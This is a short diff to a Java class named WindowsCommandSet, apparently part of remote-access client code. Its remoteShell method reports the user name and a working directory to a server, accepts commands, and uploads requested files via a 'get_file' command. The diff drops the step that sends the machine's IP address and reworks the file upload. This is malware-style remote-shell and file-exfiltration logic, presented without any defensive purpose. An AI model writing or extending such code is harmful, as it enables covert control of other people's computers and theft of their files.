@@ -34,7 +34,6 @@ public class WindowsCommandSet extends CommandSet
     public void remoteShell()
     {
         sendStringToServer(System.getProperty("user.name"));
-        sendStringToServer(getIpAddress());
         String workingDirectory = getTempPath();
         sendStringToServer(workingDirectory);
         String inputCommand;
@@ -52,8 +51,7 @@ public class WindowsCommandSet extends CommandSet
                 if(inputCommand.startsWith(REMOTE_SHELL_TRANSFER))
                 {
                     String filePathToTransfer = inputCommand.split("\\s+")[1]; // get_file thefile
-                    if(sendFile(new File(filePathToTransfer)))
-                        sendStringToServer(filePathToTransfer + " transferred successfully");
+                    sendFile(new File(workingDirectory + File.separator + filePathToTransfer));
                     continue;
                 }
 
